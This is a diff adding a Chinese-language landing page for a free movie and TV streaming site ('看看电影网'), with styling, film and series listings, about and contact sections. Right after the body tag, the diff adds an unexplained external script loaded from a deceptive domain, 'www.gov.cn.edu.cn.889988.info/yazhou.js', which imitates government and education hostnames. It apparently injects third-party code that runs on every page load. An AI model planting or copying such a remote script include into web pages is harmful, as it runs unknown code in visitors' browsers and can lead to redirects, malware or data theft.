@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>看看电影网 - 高清影视在线观看</title>
+<meta name="description" content="看看电影网(kankandianyingwang-app)提供最新高清电影、电视剧、综艺在线观看，每日更新，免费畅享。">
+<meta name="keywords" content="看看电影网, kankandianyingwang-app, 高清电影, 在线观影, 免费影视">
+<meta name="author" content="看看电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://kankandianyingwang-app">
+<style>
+/* ===== 全局重置与基础 ===== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html {
+    scroll-behavior: smooth;
+    font-size: 16px;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+    background: #0a0a0f;
+    color: #e0e0e0;
+    line-height: 1.6;
+    overflow-x: hidden;
+}
+
+/* ===== 导航栏 ===== */
+.navbar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 1000;
+    background: rgba(10, 10, 15, 0.85);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    transition: all 0.3s ease;
+}
+
+.nav-container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 1.5rem;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    height: 64px;
+}
+
+.nav-logo {
+    font-size: 1.5rem;
+    font-weight: 800;
+    background: linear-gradient(135deg, #e50914, #ff6b6b, #ffd93d);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    text-decoration: none;
+    letter-spacing: -0.5px;
+}
+
+.nav-menu {
+    display: flex;
+    gap: 2rem;
+    list-style: none;
+}
+
+.nav-menu a {
+    color: #b0b0b0;
+    text-decoration: none;
+    font-size: 0.9rem;
+    font-weight: 500;
+    transition: color 0.3s ease;
+    position: relative;
+}
+
+.nav-menu a:hover {
+    color: #e50914;
+}
+
+.nav-menu a::after {
+    content: '';
+    position: absolute;
+    bottom: -4px;
+    left: 0;
+    width: 0;
+    height: 2px;
+    background: linear-gradient(90deg, #e50914, #ff6b6b);
+    transition: width 0.3s ease;
+}
+
+.nav-menu a:hover::after {
+    width: 100%;
+}
+
+/* ===== Hero 区域 ===== */
+.hero {
+    margin-top: 64px;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+    padding: 2rem 1.5rem;
+}
+
+.hero::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: 
+        radial-gradient(circle at 20% 50%, rgba(229, 9, 20, 0.15) 0%, transparent 50%),
+        radial-gradient(circle at 80% 80%, rgba(255, 107, 107, 0.1) 0%, transparent 50%),
+        radial-gradient(circle at 50% 0%, rgba(255, 217, 61, 0.08) 0%, transparent 50%);
+    pointer-events: none;
+}
+
+.hero-content {
+    text-align: center;
+    max-width: 800px;
+    position: relative;
+    z-index: 1;
+}
+
+.hero-badge {
+    display: inline-block;
+    padding: 0.4rem 1.2rem;
+    background: rgba(229, 9, 20, 0.15);
+    border: 1px solid rgba(229, 9, 20, 0.3);
+    border-radius: 50px;
+    font-size: 0.8rem;
+    color: #ff6b6b;
+    margin-bottom: 1.5rem;
+    letter-spacing: 1px;
+}
+
+.hero h1 {
+    font-size: clamp(2.5rem, 8vw, 4.5rem);
+    font-weight: 900;
+    line-height: 1.1;
+    margin-bottom: 1.5rem;
+    background: linear-gradient(180deg, #ffffff 0%, #b0b0b0 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+
+.hero h1 span {
+    background: linear-gradient(135deg, #e50914, #ff6b6b, #ffd93d);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+
+.hero-url {
+    font-size: 1.1rem;
+    color: #888;
+    margin-bottom: 2rem;
+    font-family: "SF Mono", "Fira Code", monospace;
+}
+
+.hero-url a {
+    color: #ff6b6b;
+    text-decoration: none;
+    border-bottom: 1px dashed rgba(255, 107, 107, 0.4);
+    transition: all 0.3s ease;
+}
+
+.hero-url a:hover {
+    color: #e50914;
+    border-bottom-color: #e50914;
+}
+
+.hero-desc {
+    font-size: 1.1rem;
+    color: #888;
+    margin-bottom: 2.5rem;
+    max-width: 600px;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.hero-cta {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+    padding: 1rem 2.5rem;
+    background: linear-gradient(135deg, #e50914, #ff4757);
+    color: white;
+    text-decoration: none;
+    border-radius: 50px;
+    font-weight: 600;
+    font-size: 1rem;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 25px rgba(229, 9, 20, 0.4);
+}
+
+.hero-cta:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 35px rgba(229, 9, 20, 0.6);
+}
+
+/* ===== 通用 Section ===== */
+.section {
+    padding: 5rem 1.5rem;
+    max-width: 1200px;
+    margin: 0 auto;
+}
+
+.section-header {
+    text-align: center;
+    margin-bottom: 3.5rem;
+}
+
+.section-badge {
+    display: inline-block;
+    padding: 0.3rem 1rem;
+    background: rgba(255, 217, 61, 0.1);
+    border: 1px solid rgba(255, 217, 61, 0.2);
+    border-radius: 50px;
+    font-size: 0.75rem;
+    color: #ffd93d;
+    margin-bottom: 1rem;
+    letter-spacing: 1px;
+}
+
+.section-title {
+    font-size: clamp(1.8rem, 5vw, 2.5rem);
+    font-weight: 800;
+    color: #fff;
+    margin-bottom: 1rem;
+}
+
+.section-subtitle {
+    font-size: 1rem;
+    color: #666;
+    max-width: 500px;
+    margin: 0 auto;
+}
+
+/* ===== 电影推荐 ===== */
+.movie-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 1.5rem;
+}
+
+.movie-card {
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid rgba(255, 255, 255, 0.06);
+    border-radius: 16px;
+    overflow: hidden;
+    transition: all 0.3s ease;
+    cursor: pointer;
+}
+
+.movie-card:hover {
+    transform: translateY(-6px);
+    border-color: rgba(229, 9, 20, 0.3);
+    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
+}
+
+.movie-poster {
+    width: 100%;
+    height: 280px;
+    background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+}
+
+.movie-poster::after {
+    content: '▶';
+    font-size: 3rem;
+    color: rgba(255, 255, 255, 0.2);
+}
+
+.movie-info {
+    padding: 1.2rem;
+}
+
+.movie-title {
+    font-size: 0.95rem;
+    font-weight: 600;
+    color: #e0e0e0;
+    margin-bottom: 0.5rem;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+.movie-meta {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    font-size: 0.8rem;
+    color: #666;
+}
+
+.movie-rating {
+    display: flex;
+    align-items: center;
+    gap: 0.3rem;
+    color: #ffd93d;
+}
+
+/* ===== 电视剧 ===== */
+.tv-section {
+    background: rgba(255, 255, 255, 0.01);
+    border-top: 1px solid rgba(255, 255, 255, 0.04);
+    border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+}
+
+.tv-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+    gap: 1.5rem;
+}
+
+.tv-card {
+    display: flex;
+    gap: 1rem;
+    padding: 1.2rem;
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid rgba(255, 255, 255, 0.06);
+    border-radius: 12px;
+    transition: all 0.3s ease;
+}
+
+.tv-card:hover {
+    background: rgba(255, 255, 255, 0.06);
+    border-color: rgba(255, 107, 107, 0.2);
+}
+
+.tv-thumb {
+    width: 100px;
+    height: 140px;
+    border-radius: 8px;
+    background: linear-gradient(135deg, #2d1b69, #11998e);
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 2rem;
+}
+
+.tv-detail h3 {
+    font-size: 0.95rem;
+    color: #e0e0e0;
+    margin-bottom: 0.5rem;
+}
+
+.tv-detail p {
+    font-size: 0.8rem;
+    color: #666;
+    line-height: 1.5;
+    display: -webkit-box;
+    -webkit-line-clamp: 3;
+    -webkit-box-orient: vertical;
+    overflow: hidden;
+}
+
+.tv-detail .tv-tag {
+    display: inline-block;
+    padding: 0.2rem 0.6rem;
+    background: rgba(255, 107, 107, 0.15);
+    color: #ff6b6b;
+    border-radius: 4px;
+    font-size: 0.7rem;
+    margin-top: 0.5rem;
+    margin-right: 0.4rem;
+}
+
+/* ===== 关于我们 ===== */
+.about-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 2rem;
+}
+
+.about-card {
+    text-align: center;
+    padding: 2.5rem 1.5rem;
+    background: rgba(255, 255, 255, 0.02);
+    border: 1px solid rgba(255, 255, 255, 0.05);
+    border-radius: 20px;
+    transition: all 0.3s ease;
+}
+
+.about-card:hover {
+    background: rgba(255, 255, 255, 0.05);
+    transform: translateY(-4px);
+}
+
+.about-icon {
+    width: 60px;
+    height: 60px;
+    margin: 0 auto 1.5rem;
+    background: linear-gradient(135deg, rgba(229, 9, 20, 0.2), rgba(255, 107, 107, 0.1));
+    border-radius: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.8rem;
+}
+
+.about-card h3 {
+    font-size: 1.1rem;
+    color: #e0e0e0;
+    margin-bottom: 0.8rem;
+}
+
+.about-card p {
+    font-size: 0.85rem;
+    color: #666;
+    line-height: 1.7;
+}
+
+/* ===== 联系我们 ===== */
+.contact-wrapper {
+    max-width: 600px;
+    margin: 0 auto;
+    text-align: center;
+}
+
+.contact-info {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 1.5rem;
+    margin-top: 2rem;
+}
+
+.contact-item {
+    padding: 1.5rem;
+    background: rgba(255, 255, 255, 0.02);
+    border: 1px solid rgba(255, 255, 255, 0.05);
+    border-radius: 12px;
+}
+
+.contact-item .contact-label {
+    font-size: 0.75rem;
+    color: #666;
+    margin-bottom: 0.5rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+
+.contact-item .contact-value {
+    font-size: 0.95rem;
+    color: #e0e0e0;
+    font-weight: 500;
+}
+
+.contact-item .contact-value a {
+    color: #ff6b6b;
+    text-decoration: none;
+}
+
+/* ===== 页脚 ===== */
+.footer {
+    padding: 3rem 1.5rem 2rem;
+    border-top: 1px solid rgba(255, 255, 255, 0.05);
+    text-align: center;
+}
+
+.footer-logo {
+    font-size: 1.3rem;
+    font-weight: 800;
+    background: linear-gradient(135deg, #e50914, #ff6b6b);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    margin-bottom: 1rem;
+}
+
+.footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 2rem;
+    margin-bottom: 1.5rem;
+    flex-wrap: wrap;
+}
+
+.footer-links a {
+    color: #555;
+    text-decoration: none;
+    font-size: 0.85rem;
+    transition: color 0.3s ease;
+}
+
+.footer-links a:hover {
+    color: #ff6b6b;
+}
+
+.footer-copy {
+    font-size: 0.75rem;
+    color: #444;
+}
+
+/* ===== 响应式 ===== */
+@media (max-width: 768px) {
+    .nav-menu {
+        display: none;
+    }
+    
+    .hero {
+        min-height: 90vh;
+        padding-top: 4rem;
+    }
+    
+    .section {
+        padding: 3.5rem 1.2rem;
+    }
+    
+    .movie-grid {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 1rem;
+    }
+    
+    .movie-poster {
+        height: 220px;
+    }
+    
+    .tv-grid {
+        grid-template-columns: 1fr;
+    }
+    
+    .tv-card {
+        flex-direction: column;
+    }
+    
+    .tv-thumb {
+        width: 100%;
+        height: 160px;
+    }
+    
+    .about-grid {
+        grid-template-columns: 1fr;
+    }
+    
+    .footer-links {
+        gap: 1rem;
+    }
+}
+
+@media (max-width: 480px) {
+    .hero h1 {
+        font-size: 2rem;
+    }
+    
+    .hero-desc {
+        font-size: 0.95rem;
+    }
+    
+    .movie-grid {
+        grid-template-columns: 1fr;
+    }
+    
+    .section-title {
+        font-size: 1.5rem;
+    }
+}
+
+/* ===== 滚动动画 ===== */
+.fade-in {
+    opacity: 0;
+    transform: translateY(30px);
+    transition: all 0.8s ease;
+}
+
+.fade-in.visible {
+    opacity: 1;
+    transform: translateY(0);
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 导航栏 -->
+<nav class="navbar" role="navigation" aria-label="主导航">
+    <div class="nav-container">
+        <a href="#" class="nav-logo">看看电影网</a>
+        <ul class="nav-menu">
+            <li><a href="#home">首页</a></li>
+            <li><a href="#movies">电影推荐</a></li>
+            <li><a href="#tv">电视剧</a></li>
+            <li><a href="#about">关于我们</a></li>
+            <li><a href="#contact">联系我们</a></li>
+        </ul>
+    </div>
+</nav>
+
+<!-- Hero 区域 -->
+<section class="hero" id="home">
+    <div class="hero-content fade-in visible">
+        <div class="hero-badge">🎬 全新影视体验</div>
+        <h1>看看电影网<br><span>高清影视免费看</span></h1>
+        <div class="hero-url">
+            访问官网：<a href="https://kankandianyingwang-app" target="_blank" rel="noopener">kankandianyingwang-app</a>
+        </div>
+        <p class="hero-desc">看看电影网(kankandianyingwang-app)汇聚全网最新高清电影、热播电视剧、经典综艺，每日更新，极速播放，带给你沉浸式观影体验。</p>
+        <a href="#movies" class="hero-cta">立即探索 →</a>
+    </div>
+</section>
+
+<!-- 电影推荐 -->
+<section class="section" id="movies">
+    <div class="section-header fade-in">
+        <div class="section-badge">MOVIE</div>
+        <h2 class="section-title">热门电影推荐</h2>
+        <p class="section-subtitle">精选高分大片，每日更新，畅享视觉盛宴</p>
+    </div>
+    <div class="movie-grid">
+        <div class="movie-card fade-in">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">沙丘2：星际觉醒</div>
+                <div class="movie-meta">
+                    <span>2024 · 科幻</span>
+                    <span class="movie-rating">★ 9.2</span>
+                </div>
+            </div>
+        </div>
+        <div class="movie-card fade-in">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">奥本海默</div>
+                <div class="movie-meta">
+                    <span>2023 · 传记</span>
+                    <span class="movie-rating">★ 9.0</span>
+                </div>
+            </div>
+        </div>
+        <div class="movie-card fade-in">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">蜘蛛侠：纵横宇宙</div>
+                <div class="movie-meta">
+                    <span>2023 · 动画</span>
+                    <span class="movie-rating">★ 8.8</span>
+                </div>
+            </div>
+        </div>
+        <div class="movie-card fade-in">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">流浪地球2</div>
+                <div class="movie-meta">
+                    <span>2023 · 科幻</span>
+                    <span class="movie-rating">★ 8.9</span>
+                </div>
+            </div>
+        </div>
+        <div class="movie-card fade-in">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">封神第一部</div>
+                <div class="movie-meta">
+                    <span>2023 · 奇幻</span>
+                    <span class="movie-rating">★ 8.5</span>
+                </div>
+            </div>
+        </div>
+        <div class="movie-card fade-in">
+            <div class="movie-poster"></div>
+            <div class="movie-info">
+                <div class="movie-title">满江红</div>
+                <div class="movie-meta">
+                    <span>2023 · 悬疑</span>
+                    <span class="movie-rating">★ 8.3</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 电视剧 -->
+<section class="section tv-section" id="tv">
+    <div class="section-header fade-in">
+        <div class="section-badge">TV SERIES</div>
+        <h2 class="section-title">热播电视剧</h2>
+        <p class="section-subtitle">追剧不停歇，好剧一网打尽</p>
+    </div>
+    <div class="tv-grid">
+        <div class="tv-card fade-in">
+            <div class="tv-thumb">📺</div>
+            <div class="tv-detail">
+                <h3>繁花</h3>
+                <p>王家卫执导，胡歌领衔主演，讲述90年代上海黄河路上的商战风云与人间烟火。</p>
+                <span class="tv-tag">剧情</span>
+                <span class="tv-tag">年代</span>
+            </div>
+        </div>
+        <div class="tv-card fade-in">
+            <div class="tv-thumb">📺</div>
+            <div class="tv-detail">
+                <h3>庆余年第二季</h3>
+                <p>张若昀主演，范闲归来，朝堂博弈再升级，权谋与幽默并存。</p>
+                <span class="tv-tag">古装</span>
+                <span class="tv-tag">权谋</span>
+            </div>
+        </div>
+        <div class="tv-card fade-in">
+            <div class="tv-thumb">📺</div>
+            <div class="tv-detail">
+                <h3>三体</h3>
+                <p>刘慈欣同名科幻巨作改编，全景呈现人类面对外星文明的抉择与挣扎。</p>
+                <span class="tv-tag">科幻</span>
+                <span class="tv-tag">悬疑</span>
+            </div>
+        </div>
+        <div class="tv-card fade-in">
+            <div class="tv-thumb">📺</div>
+            <div class="tv-detail">
+                <h3>漫长的季节</h3>
+                <p>辛爽执导，范伟、秦昊主演，跨越二十年的悬疑故事，口碑炸裂之作。</p>
+                <span class="tv-tag">悬疑</span>
+                <span class="tv-tag">犯罪</span>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 关于我们 -->
+<section class="section" id="about">
+    <div class="section-header fade-in">
+        <div class="section-badge">ABOUT</div>
+        <h2 class="section-title">关于看看电影网</h2>
+        <p class="section-subtitle">了解我们的故事与使命</p>
+    </div>
+    <div class="about-grid">
+        <div class="about-card fade-in">
+            <div class="about-icon">🎯</div>
+            <h3>我们的使命</h3>
+            <p>看看电影网(kankandianyingwang-app)致力于为用户提供最优质的在线观影服务，让每个人都能轻松享受影视乐趣。</p>
+        </div>
+        <div class="about-card fade-in">
+            <div class="about-icon">⚡</div>
+            <h3>极速体验</h3>
+            <p>采用先进CDN加速技术，支持多清晰度切换，告别卡顿，流畅观影每一刻。</p>
+        </div>
+        <div class="about-card fade-in">
+            <div class="about-icon">📅</div>
+            <h3>每日更新</h3>
+            <p>紧跟院线节奏，每日同步更新最新电影、电视剧资源，第一时间满足你的观影需求。</p>
+        </div>
+    </div>
+</section>
+
+<!-- 联系我们 -->
+<section class="section" id="contact">
+    <div class="section-header fade-in">
+        <div class="section-badge">CONTACT</div>
+        <h2 class="section-title">联系我们</h2>
+        <p class="section-subtitle">有任何问题或建议，欢迎随时联系</p>
+    </div>
+    <div class="contact-wrapper fade-in">
+        <div class="contact-info">
+            <div class="contact-item">
+                <div class="contact-label">官方网站</div>
+                <div class="contact-value"><a href="https://kankandianyingwang-app" target="_blank" rel="noopener">kankandianyingwang-app</a></div>
+            </div>
+            <div class="contact-item">
+                <div class="contact-label">商务合作</div>
+                <div class="contact-value"><a href="#" rel="nofollow">business@kankandianyingwang-app</a></div>
+            </div>
+            <div class="contact-item">
+                <div class="contact-label">客服支持</div>
+                <div class="contact-value"><a href="#" rel="nofollow">support@kankandianyingwang-app</a></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+    <div class="footer-logo">看看电影网</div>
+    <div class="footer-links">
+        <a href="#home">首页</a>
+        <a href="#movies">电影推荐</a>
+        <a href="#tv">电视剧</a>
+        <a href="#about">关于我们</a>
+        <a href="#contact">联系我们</a>
+    </div>
+    <p class="footer-copy">© 2024 看看电影网 (kankandianyingwang-app). All rights reserved.</p>
+</footer>
+
+<script>
+// 滚动动画
+const observerOptions = {
+    threshold: 0.1,
+    rootMargin: '0px 0px -50px 0px'
+};
+
+const observer = new IntersectionObserver(function(entries) {
+    entries.forEach(entry => {
+        if (entry.isIntersecting) {
+            entry.target.classList.add('visible');
+        }
+    });
+}, observerOptions);
+
+document.querySelectorAll('.fade-in').forEach(el => {
+    observer.observe(el);
+});
+
+// 导航栏滚动效果
+let lastScroll = 0;
+const navbar = document.querySelector('.navbar');
+
+window.addEventListener('scroll', () => {
+    const currentScroll = window.pageYOffset;
+    if (currentScroll > 100) {
+        navbar.style.background = 'rgba(10, 10, 15, 0.95)';
+        navbar.style.boxShadow = '0 2px 20px rgba(0,0,0,0.3)';
+    } else {
+        navbar.style.background = 'rgba(10, 10, 15, 0.85)';
+        navbar.style.boxShadow = 'none';
+    }
+    lastScroll = currentScroll;
+});
+</script>
+
+</body>
+</html>
